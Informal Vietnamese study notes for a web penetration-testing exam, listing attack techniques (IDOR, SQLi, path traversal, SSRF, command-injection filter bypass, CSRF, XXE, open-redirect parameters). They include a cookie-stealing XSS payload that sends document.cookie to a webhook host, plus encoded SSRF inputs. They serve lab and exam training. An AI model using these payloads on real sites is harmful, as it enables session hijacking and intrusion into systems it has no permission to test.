

(CỰC KỲ CHÚ Ý THAY PAYLOAD => THAY IPPPPPP)
(CHU Y POST THI KEM THEO HEADER dung neu ko se bi sai Vidu -H "Content-Type: application/x-www-form-urlencoded")

Note dùng kĩ burp suite vì ngay cả khi server chặn truy cập nội bộ qua IDOR 
thì vẫn có thể nó quên tắt hiển thị code trc khi chuyển hg về trang dsangw nhập 
=> đọc kĩ reponese vì rất có thể có code

// payload cmd command qua paramêtr GET phai  => url encode
//brute force gia tri co the them  <the X-Forwarded-For header and the value to one of the IPs from the array> neu bi chan

//IDOR neu tham so lien quan den truy van du lieu nhu id => danh sach 
// ngoai khai thac thong tin, thu nghi den SQLi
// ..%2f..%2f..%2f..%2fetc%2fhosts  meo de LFI
"Khi gặp các param động kiểu id, url, file, host, target, thì đừng tin tưởng. Fuzz mọi thứ như IDOR, SQLi, Command Injection, LFI, SSRF – kể cả khi nó không trông giống gì độc hại. Web dev nhiều khi để sót."

// muon doc xmlrpc.php POST
curl -X POST "http://94.237.51.203:46091/xmlrpc.php" -d "<?xml version="1.0" encoding="utf-8"?> 
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>


//SSRF QUA PARAM CAN THAN NEU CO ENCODE 
1. URL Encode
bash
Sao chép
Chỉnh sửa
http://target/api/userinfo?id=http://127.0.0.1:80
# encode:
http://target/api/userinfo?id=http%3A%2F%2F127.0.0.1%3A80
2. Base64 Encode
Giả sử server decode base64 trước khi xử lý:

bash
Sao chép
Chỉnh sửa
echo -n "http://127.0.0.1:80" | base64
# => aHR0cDovLzEyNy4wLjAuMTo4MA==

hoac la
echo "http://127.0.0.1:3002" | tr -d "\n" | base64
=> ko co pad
http://target/api/userinfo?id=aHR0cDovLzEyNy4wLjAuMTo4MA==
3. JSON body (POST method)
json
Sao chép
Chỉnh sửa
POST /api/userinfo
{
  "id": "http://127.0.0.1:80"
} 


Đọc qua wrapper php zip hay các wrapper khác thì php luôn đầy đủ khác với chỉ get thông thg

Hãy tìm cách độc source nếu cần chain

Mở rộng fuzz host vhost directory, dịch vụ đuôi file khả thiii.

Nên nhớ nếu dùng get để verbtampping + idor thì phải chú ý get thì parameter dùng url, 
chứ ko phải paratmeter trong header như post,put,delette....
hay xxe thì cũng càn chú ý xem xxe có các thể loại nào.

Sqli có ther dùng tool sqlmap hoặc khai thác chi tiết, tiền đề phải chắc chắn các logic thủ công có thể thực hiện

Xss càn chú ý thường reflected và dombase

Có thể dùng ssrf để find port và địch vụ nên nhớ cod thể tồn tại cả gopher khi lừa bot truy cập nội bộ

File upload chú ý các technique để bypass file upload và chạy

Chú ý khai thác các LFI hoặc RFI tìm fuzz pareter diector và đọc source

Xác định login dễ rơi vô enum dùng hydra medusa

Chú ý mấy trò nhiêmz độc log

Xem xét các dịch vụ xem có lỗi nào cve nào có thẻt khai thác qua yếu dịch vụ cũ => khai thác qua metasploit

Hijaking session để có thể đổi mk , cướp tk , đoán username => enum đoán passswd

Enum session recovery passwd

Ssti và dịch vụ sử dụng tưmplate

Command injrct và kiểu encode bypass filter này. %0a %09 dùng ${IFS}

Tấn công login bằng brute force hoặc brute force 2fa code nâng cao đọ thêm phần này

Trước khi thi làm lại toàn bộ lần nữa => sẵn sàng thiii



5 target (each 2flag)
=> must 80 point to pass (9/10 flag)
flag (5/10/15) point

=> chain : 
ssrf => command inject,
 
xss => cookie steal (Session hijacking)
	<dieu kien exploit : session cookie duoc mang theo bring up ,trong http request, session cookie co the duoc truy cap = javascript code xss de leak ra ngoai (httponly = false/disable)>
	<luu y php server de host EVIL file co the ko gui du lieu dung cach neu may chu muc tieu su dung https, vi vay can dung xsshunter, burp collaborator, projectinteractsh> (THAT RA DUNG ME WEBHOOK CHO NHANH)
<script>fetch("https://webhook.site/abc123?c="+document.cookie)</script>



LFI => RCE (FIle upload/source read/load content from evilhost/execution php code/log POISONING)


xss => csrf

			** CO 2 KIEU CSRF : GET base (fetch) , hoac POST base (form)
				=> host qua web ung dung github
			=> webhook
			=>  https://github.com/dotlinux26/testxss/blob/main/index.html
			=> https://darling-heliotrope-3eeb1c.netlify.app/
			=> https://app.netlify.com/projects/darling-heliotrope-3eeb1c/deploys


MO RONG SUY NGHI THU BASE64, MA HOA HEX, MD5 CAC CHUOI GIA TRI NHU ID, USERNAME THU XEM CO BYPASS DUOC CSRF HAY CAC THE LOAI BAO MAT KO


// mot so kieu bypass csrf
https://academy.hackthebox.com/module/153/section/1452

// kiem tra xem co open redirect chuyen huong k
/login.php?redirect=dashboard // co the con dan den LFI

?url=
?link=
?redirect=
?redirecturl=
?redirect_uri=
?return=
?return_to=
?returnurl=
?go=
?goto=
?exit=
?exitpage=
?fromurl=
?fromuri=
?redirect_to=
?next=
?newurl=
?redir=

✅ Tình huống bạn mô tả:
API kiểu REST, hỗ trợ cả XML và JSON.

Hệ thống lọc tốt với XML → chặn <!DOCTYPE>, ENTITY, etc.

Nhưng khi gửi cùng payload bằng JSON → không bị chặn 😈

→ Đây là điểm vàng để vượt filter hoặc chuyển hướng tấn công (XXE, XSS, Injection, logic flaw…)


